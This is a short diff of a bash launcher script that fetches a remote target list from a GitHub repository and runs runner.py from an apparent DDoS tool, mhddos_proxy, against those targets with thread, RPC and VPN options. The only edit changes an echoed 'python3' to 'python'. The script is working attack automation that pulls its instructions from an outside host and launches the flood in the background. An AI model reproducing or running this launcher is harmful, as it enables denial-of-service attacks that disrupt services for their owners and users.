@@ -259,7 +259,7 @@ do
             		cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]")")
            
             		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
-            		echo "python3 runner.py $cmd_line --rpc $rpc -t $threads $vpn $debug"
+            		echo "python runner.py $cmd_line --rpc $rpc -t $threads $vpn $debug"
             
             		cd ~/mhddos_proxy
             		python runner.py $cmd_line --rpc $rpc -t $threads $vpn $debug&
